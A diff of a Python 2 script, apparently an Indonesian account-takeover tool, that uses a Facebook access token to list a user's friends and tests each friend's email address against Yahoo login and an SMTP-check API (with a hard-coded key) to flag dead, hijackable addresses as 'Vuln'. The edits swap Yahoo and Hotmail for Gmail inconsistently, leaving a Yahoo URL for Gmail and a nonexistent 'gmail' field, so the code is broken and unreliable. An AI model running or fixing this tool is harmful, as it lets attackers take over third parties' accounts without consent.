@@ -20,7 +20,7 @@ else:
 get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
 hasil = json.loads(get_friends.text)
 print ("\033[39m[\033[31m+\033[39m] Berhasil Mendapatkan ID Teman...")
-#cok = open('Mail_Yahoo.txt','w')
+#cok = open('email_gmail.txt','w')
 def defense():
     global o, h
     o = []
@@ -38,8 +38,8 @@ def defense():
         try:
             kunci = re.compile(r'@.*')
             cari = kunci.search(z['email']).group()
-            if 'yahoo.com' in cari:
-                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+            if 'gmail.com' in cari:
+                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.gmail.com")
                 br._factory.is_html = True
                 br.select_form(nr=0)
                 br["username"] = z['email']
@@ -69,21 +69,21 @@ def defense():
                 lone = 24 - (len(vuln))
                 namel = lone * " "
                 print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
-            elif 'hotmail' in cari:
-                url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1")
+            elif 'gmail' in cari:
+                url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&gmail=" + z['gmail'] + "&smtp=1&format=1")
                 cek = json.loads(requests.get(url).text)
                 if cek['smtp_check'] == 0:
                     vuln = 8*" " + "\033[32mVuln"
 
                 else:
                     vuln = 5*" " + "\033[31mNot Vuln"
-                lean = 30 - (len(z['email']))
+                lean = 30 - (len(z['gmail']))
                 eml = lean * " "
                 #Name Len
                 #Author: Zen-Oh-Sama
                 lone = 24 - (len(vuln))
                 namel = lone * " "
-                print "\033[36m| " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
+                print "\033[36m| " + wrna + z['gmail'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
             else:
                 pass
         except KeyError:
